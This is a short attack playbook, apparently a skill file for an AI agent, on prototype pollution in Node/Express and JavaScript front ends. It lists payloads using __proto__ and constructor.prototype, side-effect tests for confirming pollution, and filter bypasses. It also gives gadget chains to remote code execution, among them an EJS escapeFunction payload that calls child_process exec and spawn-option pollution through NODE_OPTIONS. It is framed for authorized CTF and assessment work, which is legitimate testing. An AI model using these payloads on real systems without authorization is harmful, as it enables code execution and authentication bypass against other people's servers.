name: prototype-pollution
description: Prototype pollution testing for JavaScript stacks — when user input is merged into objects (query parsers, JSON bodies, deep assign), pollute Object.prototype via __proto__ / constructor.prototype, then trigger a gadget (EJS, child_process/NODE_OPTIONS, JSON options) for RCE or logic bypass. Use on Node/Express/qs-style backends and JS frontends with deep-merge patterns.
---

# Prototype Pollution Attack Playbook

Authorized CTF/assessment use. Prototype pollution turns "one extra key" into a GLOBAL object mutation — then a later code path reads the polluted property and does something dangerous. The two halves: (1) pollute the prototype, (2) hit a gadget that reads it.

## 1. Mechanism & detection

**The two polluting keys (test BOTH):**
```json
{"__proto__": {"polluted": true}}
{"constructor": {"prototype": {"polluted": true}}}
```
`__proto__` is the classic; `constructor.prototype` bypasses filters that only block the `__proto__` literal. Not always equivalent (JSON parsing, Bun/Node differences) — so send both.

**Where:** deep merges (`lodash.merge`, `deep-extend`, `hoek.applyToDefaults`), recursive assign, `JSON.parse` + `Object.assign`, URL query → nested object (qs/query-string).

## 2. Confirm pollution (server-side, black-box)

Send a pollution payload, then a CLEAN follow-up request and watch for global side effects:

| Pollute | Observable signal |
|---|---|
| `{"__proto__":{"parameterLimit":1}}` | multi-param parsing breaks in follow-ups |
| `{"__proto__":{"json spaces":" "}}` | JSON responses gain extra spacing |
| `{"__proto__":{"status":510}}` | response status changes to 510 |
| `{"__proto__":{"allowDots":true}}` | `?foo.bar=baz` suddenly works |

Client-side (URL fragment): `#__proto__[admin]=1` then check `Object.prototype.admin` in console.

## 3. Gadgets (pollution → impact)

- **EJS RCE:** `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('CMD')"}}` — when template options are read from the prototype.
- **child_process:** pollute `shell`, `env`, `NODE_OPTIONS`, `argv0` (merged into `spawn`/`fork` options) → RCE when a later spawn reads them.
- **JSON.stringify options:** pollute `json spaces` / `toJSON` for data/DoS.
- **CORS/headers:** pollute `exposedHeaders` etc. when the framework reads config off the prototype.
- **Generic constructor path:** `{"constructor":{"prototype":{"foo":"bar"}}}` to slip past `__proto__`-key filters.

**Chain mindset:** pollution → some dependency reads `obj.settings.xxx` without `hasOwnProperty` → RCE / SSRF / path traversal / auth bypass.

## 4. Decision tree

```
Input merged into a nested object (query/JSON/GraphQL vars/YAML→JSON)?
  └─ YES → parser allows __proto__ / constructor.prototype?
        └─ YES → confirm global effect (clean follow-up request)
              └─ gadget present? (template, spawn, JSON options, CORS)
                    ├─ YES → build minimal RCE / high-impact PoC
                    └─ NO  → report as logic/DoS impact
        └─ NO  → try unicode/key-name bypass, or constructor path
```

## Cross-cutting
- **Pollute first, then probe a clean request** — the impact is global and delayed, not in the first response.
- **`constructor.prototype` is the bypass** when `__proto__` is filtered.
- Self-verify the pollution (a visible global change) before hunting gadgets.
